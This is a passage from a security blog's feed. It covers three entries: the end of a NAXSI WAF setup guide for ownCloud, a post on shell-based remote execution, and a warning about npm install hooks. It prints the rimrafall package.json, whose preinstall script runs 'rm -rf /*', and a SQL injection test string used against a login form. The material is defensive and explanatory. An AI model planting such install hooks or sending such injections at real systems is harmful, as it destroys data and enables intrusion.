BasicRule  wl:1005 &quot;mz:$URL:/index.php/core/ajax/share.php|$BODY_VAR:sharewith[password]&quot;;
BasicRule  wl:1008 &quot;mz:$URL:/index.php/apps/gallery/files/list|$ARGS_VAR:mediatypes&quot;;
BasicRule  wl:1008 &quot;mz:$URL:/index.php/apps/gallery/thumbnails|$ARGS_VAR:ids&quot;;
BasicRule  wl:1008 &quot;mz:$URL:/index.php/apps/galleryplus/files/list|$ARGS_VAR:mediatypes&quot;;
BasicRule  wl:1008 &quot;mz:$URL:/index.php/apps/galleryplus/thumbnails|$ARGS_VAR:ids&quot;;
BasicRule  wl:1009 &quot;mz:$URL:/index.php/apps/files_pdfviewer/|$ARGS_VAR:file&quot;;
BasicRule  wl:1001,1009,1010,1011,1310,1311 &quot;mz:$URL:/index.php/settings/personal/changepassword|$BODY_VAR:oldpassword&quot;;
BasicRule  wl:1001,1009,1010,1011,1310,1311 &quot;mz:$URL:/index.php/settings/personal/changepassword|$BODY_VAR:personal-password&quot;;
BasicRule  wl:1001,1009,1010,1011,1310,1311 &quot;mz:$URL:/index.php/settings/personal/changepassword|$BODY_VAR:personal-password-clone&quot;;
BasicRule  wl:1001,1009,1010,1011,1310,1311 &quot;mz:$URL:/index.php/settings/users/users|$BODY_VAR:password&quot;;
BasicRule  wl:1001,1009,1010,1011,1310,1311 &quot;mz:$URL:/|$BODY_VAR:password&quot;;
BasicRule  wl:1302,1303 &quot;mz:$URL:/index.php/apps/files/api/v1/tags/_$!&amp;lt;Favorite&amp;gt;!$_/files|URL&quot;;
BasicRule  wl:1310,1311 &quot;mz:$URL:/index.php/avatar/cropped|BODY|NAME&quot;;
BasicRule  wl:1310,1311 &quot;mz:$URL:/index.php/core/ajax/share.php|ARGS|NAME&quot;;
BasicRule  wl:1310,1311 &quot;mz:$URL:/index.php/core/ajax/share.php|BODY|NAME&quot;;
BasicRule  wl:1310,1311 &quot;mz:$URL:/index.php/settings/users/users|BODY|NAME&quot;;
BasicRule  wl:1311,1310,1011 &quot;mz:$URL:/index.php/settings/users/users|BODY|NAME&quot;;
BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1315 &quot;mz:$URL:/index.php/apps/files_pdfviewer/|$ARGS_VAR:file&quot;;
BasicRule  wl:16 &quot;mz:$URL:/index.php/heartbeat|BODY&quot;;
BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;
BasicRule  wl:2 &quot;mz:$URL:/index.php/avatar/|BODY&quot;;
BasicRule wl:17 &quot;mz:$URL_X:/remote.php/webdav|$HEADERS_VAR:Accept&quot;; #wl libinjection_sql on header
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Save this whitelist to &lt;code&gt;waf/naxsi_whitelist.rules&lt;/code&gt; in the project’s folder. Change the &lt;code&gt;create_start.sh&lt;/code&gt; to disable learning mode of NAXSI and switch over to LIVE mode.&lt;/p&gt;

&lt;p&gt;```bash
#!/bin/bash&lt;/p&gt;

&lt;h1 id=&quot;to-create-naxsi-rules&quot;&gt;to create naxsi rules&lt;/h1&gt;
&lt;p&gt;#docker run –name elasticsearch -p 9200:9200 -p 9300:9300 -d elasticsearch elasticsearch -Des.network.host=0.0.0.0
#docker create –name owncloud-naxsi -e PROXY_REDIRECT_IP=owncloud -e LEARNING_MODE=yes –link owncloud-nginx:owncloud –link elasticsearch:elasticsearch -p 443:443 owncloud-naxsi&lt;/p&gt;

&lt;h1 id=&quot;productiv&quot;&gt;productiv&lt;/h1&gt;
&lt;p&gt;docker create –name owncloud-naxsi -e PROXY_REDIRECT_IP=owncloud –link owncloud-nginx:owncloud -p 443:443 owncloud-naxsi
docker start owncloud-naxsi
```&lt;/p&gt;

&lt;p&gt;Change into the &lt;code&gt;waf&lt;/code&gt; folder and run &lt;code&gt;./build-image.sh&lt;/code&gt; to create a new image which includes the new &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt;. Start it via &lt;code&gt;./create_start.sh&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;test-the-naxsi-waf&quot;&gt;Test the NAXSI WAF&lt;/h2&gt;

&lt;p&gt;Watch the log file from the &lt;code&gt;owncloud-naxsi&lt;/code&gt; docker container.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
∅&amp;gt; docker exec -it owncloud-naxsi tail -f /var/log/nginx/naxsi_error.log
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Go to the owncloud login page and put &lt;code&gt;user’ or 1=1;#&lt;/code&gt; as username and password in the fields. Now you should see an error message in the NAXSI log file.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
2016/02/17 11:58:20 [error] 14#0: *1965 NAXSI_FMT: ip=127.0.0.1&amp;amp;server=127.0.0.1&amp;amp;uri=/&amp;amp;learning=0&amp;amp;vers=0.54&amp;amp;total_processed=499&amp;amp;total_blocked=8&amp;amp;block=1&amp;amp;cscore0=$SQL&amp;amp;score0=4&amp;amp;cscore1=$XSS&amp;amp;score1=8&amp;amp;zone0=BODY&amp;amp;id0=1008&amp;amp;var_name0=user, client: 127.0.0.1, server: owncloud_naxsi, request: &quot;POST / HTTP/1.0&quot;, host: &quot;127.0.0.1:8080&quot;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It’s working. Have FUN!!!&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;to-dos&quot;&gt;To Do’s&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Write permanant NAXSI events to elasticsearch&lt;/li&gt;
  &lt;li&gt;Clean NAXSI logs&lt;/li&gt;
  &lt;li&gt;Use Kibana for visualization&lt;/li&gt;
  &lt;li&gt;Clean rules&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;links&quot;&gt;Links&lt;/h1&gt;

&lt;p&gt;Thanks for the useful information on those websites&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.nbs-system.co.uk/blog-2/naxsi-web-application-firewall-for-nginx.html&quot;&gt;NBS-System Blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/nbs-system/naxsi&quot;&gt;NBS-System&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.mare-system.de/blog/page/1365686359/&quot;&gt;NAXSI - Users - Manual&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.admin-magazin.de/Das-Heft/2013/03/Nginx-als-Frontend-Gateway-mit-Naxsi-Firewall/%28offset%29/6&quot;&gt;Admin Magazin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://spike.nginx-goodies.com/rules/&quot;&gt;NAXSI Rules&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;license-and-author&quot;&gt;License and Author&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Author:: Patrick Muench &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#097;&amp;#116;&amp;#114;&amp;#105;&amp;#099;&amp;#107;&amp;#046;&amp;#109;&amp;#117;&amp;#101;&amp;#110;&amp;#099;&amp;#104;&amp;#049;&amp;#049;&amp;#049;&amp;#049;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;&amp;#112;&amp;#097;&amp;#116;&amp;#114;&amp;#105;&amp;#099;&amp;#107;&amp;#046;&amp;#109;&amp;#117;&amp;#101;&amp;#110;&amp;#099;&amp;#104;&amp;#049;&amp;#049;&amp;#049;&amp;#049;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Licensed under the Apache License, Version 2.0 (the “License”);
you may not use this file except in compliance with the License.
You may obtain a copy of the License at&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://www.apache.org/licenses/LICENSE-2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an “AS IS” BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.&lt;/p&gt;
</content>
 </entry>

 <entry>
   <title>Automation and the Shell</title>
   <link href="http://vulcanosec.com/blog/article/automation-and-the-shell"/>
   <updated>2015-06-15T23:00:00+02:00</updated>
   <id>http://vulcanosec.com/blog/article/automation-and-the-shell</id>
   <content type="html">&lt;p&gt;Managing your nodes has seen a wonderful change with the rise of DevOps and its newly found tools. Whether it’s written in Python or Ruby or runs on a custom language, we have come far from the olden days of shell-scripting your environment. Under the hood, however, in most cases, we are still true to our trusty shell. It may have become covered and deeply hidden in our modern automation languages, but it’s still there. At the end of the day, it is often the most convenient way to talk to your operating system.&lt;/p&gt;

&lt;p&gt;Security automation profits heavily from DevOps, while compliance scanning has not yet reached this field. Many people still rely on shell scripts (directly or through through commands run by a scanner) to cover this area. VulcanoSec is changing this field, and bringing the knowledge of development to security testing. Similar to DevOps tools, however, it uses the shell wherever convenient under the hood.&lt;/p&gt;

&lt;p&gt;As we will see in this article, there are many cases where this approach make our lives easier. In the end, it all boils down to command execution. We will take a look at the different styles of running commands on your nodes and the consequences they have.&lt;/p&gt;

&lt;h2 id=&quot;remote-execution-case-1&quot;&gt;Remote Execution (case 1)&lt;/h2&gt;

&lt;p&gt;This is probably one of the oldest cases for automating commands in your environment: A server delivers shell commands via (hopefully) secure channel to the node, which then executes them and reports back the results.&lt;/p&gt;

&lt;p&gt;For a simple example, take a server which connects to a client machine via SSH and runs some shell commands:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
pssh -h ips.txt -o /tmp/installs apt-get install apache2
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This will install Apache on all your Debian and Ubuntu nodes.&lt;/p&gt;

&lt;p&gt;There are some obvious limitations here, as our example shows. What about running this on RedHat, Fedora, SuSe, Windows? It won’t yield the desired results.&lt;/p&gt;

&lt;p&gt;However, these issues can be solved, if your server knows the target system and can adjust the command it will run. All you have to do, is to tell your server to install:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
package &quot;apache&quot;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and it would run the appropriate command on each node:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
# for Ubuntu/Debian:
apt-get install apache2
# for RedHat/CentOS:
yum install httpd
...
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This method doesn’t require any additional component running on the client, except for a remote access with shell execution.&lt;/p&gt;

&lt;h2 id=&quot;lokal-agent-case-2&quot;&gt;Lokal Agent (case 2)&lt;/h2&gt;

&lt;p&gt;While the first method sends shell commands to the node, this approach instead creates and runs the commands on the target directly. Usually it involves installing an additional component on your clients, which is called the agent. It will end up running commands just once or regularly throughout its lifetime.&lt;/p&gt;

&lt;p&gt;Similar to the example above, the commands may be written in the targeted shell script directly (&lt;code&gt;apt-get install ...&lt;/code&gt;), or may be embedded in a convenient language (&lt;code&gt;package &#39;apache&#39;&lt;/code&gt;). In any case, the common layer often translates them into shell commands, which are then executed.&lt;/p&gt;

&lt;p&gt;The source of these commands is also different. Depending on your needs, you may like to control all nodes from a central server. This would allow the agent to retrieve all commands it requires from the server and run them on the local node. Once again, it may retrieves raw shell commands from the server, or a script written in a different language which is then interpreted and translated on the node.&lt;/p&gt;

&lt;p&gt;The other approach is a standalone execution of commands. In this model, all commands are pre-installed with the agent and may be udpated by e.g. deployment scripts. In the end, the agent takes these commands, translates them if necessary, and executes everything on the node.&lt;/p&gt;

&lt;h2 id=&quot;alternate-execution-case-3&quot;&gt;Alternate execution (case 3)&lt;/h2&gt;

&lt;p&gt;Taking everything into account we have seen so far, we can mix and combine these solutions to achieve the right fit for our environment. As long as we are able to reach the shell, as a common layer of execution, we are likely able to alter the way in which commands are delivered and executed.&lt;/p&gt;

&lt;p&gt;Let’s construct a small example: We want to run a security check on a machine. Regularly we would use our server to log into the node and run all commands on the client’s shell (case 1). However, some machines may not grant such access. We can offer to install an agent instead, which gets its commands from a central server (case 2). But what if the client doesn’t want to install our agent? This may be the case for critical infrastructure, which must be treated carefully.&lt;/p&gt;

&lt;p&gt;In this case, we could just hand all shell-commands our server would transfer in case 1, and provide them to the client directly. As this is the least common layer, there is no installation of additional components on the client and the operator could retain full control over what is transferred to the server. If you look at it closely, however, this is just one variant of case 2: You use the client’s shell directly and run a different proxy for the work your agent would do. In principle, however, nothing changes.&lt;/p&gt;

&lt;p&gt;The real challenge of this case, is to provide the most common layer which requires the least adjustments over time.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Managing your nodes remotely has seen different mechanisms, often running on top of the operating system’s shell (or equivalent). These may provide their own language, to help operators focus on their goals instead of low-level issues.&lt;/p&gt;

&lt;p&gt;While many security professionals are still often scripting on the shell layer directly, there are solutions that take the power and simplicity from development and bringing it to the realm of security and compliance.&lt;/p&gt;

&lt;p&gt;At VulcanoSec, we provide a security and compliance scanner, that covers all three models seen above: Remote command execution, local agents, and an alternate execution layer. You can choose your favorite approach based on your environment and infrastructure requirements. If you are already familiar with DevOps solutions, you will feel right at home with this DevSec solution.&lt;/p&gt;
</content>
 </entry>

 <entry>
   <title>`npm install` could be dangerous</title>
   <link href="http://vulcanosec.com/blog/article/npm-dependency"/>
   <updated>2015-03-01T22:00:00+01:00</updated>
   <id>http://vulcanosec.com/blog/article/npm-dependency</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/&quot;&gt;NPM&lt;/a&gt; hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?&lt;/p&gt;

&lt;p&gt;Just recently, &lt;a href=&quot;https://github.com/joaojeronimo&quot;&gt;João Jerónimo&lt;/a&gt; published a special npm modules called &lt;a href=&quot;https://github.com/joaojeronimo/rimrafall&quot;&gt;rimrafall&lt;/a&gt;. He published it at npm and posted it on &lt;a href=&quot;https://news.ycombinator.com/item?id=8947493&quot;&gt;Hacker News&lt;/a&gt;. Essentially this module does the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo su -
rm -rf /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It uses a special script tag in &lt;code&gt;package.json&lt;/code&gt; to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.&lt;/p&gt;

&lt;p&gt;The package.json looks as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
  &quot;name&quot;: &quot;rimrafall&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;rm -rf /* # DO NOT INSTALL THIS&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;scripts&quot;: {
    &quot;preinstall&quot;: &quot;rm -rf /*&quot;
  },
  &quot;keywords&quot;: [
    &quot;rimraf&quot;,
    &quot;rmrf&quot;
  ],
  &quot;author&quot;: &quot;João Jerónimo&quot;,
  &quot;license&quot;: &quot;ISC&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.&lt;/p&gt;

&lt;p&gt;Although there is no easy mitigation, you could start building all your node code in a Docker container or use &lt;code&gt;npm install --ignore-scripts&lt;/code&gt;. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module without much stars.&lt;/p&gt;

</content>
 </entry>
 

</feed>
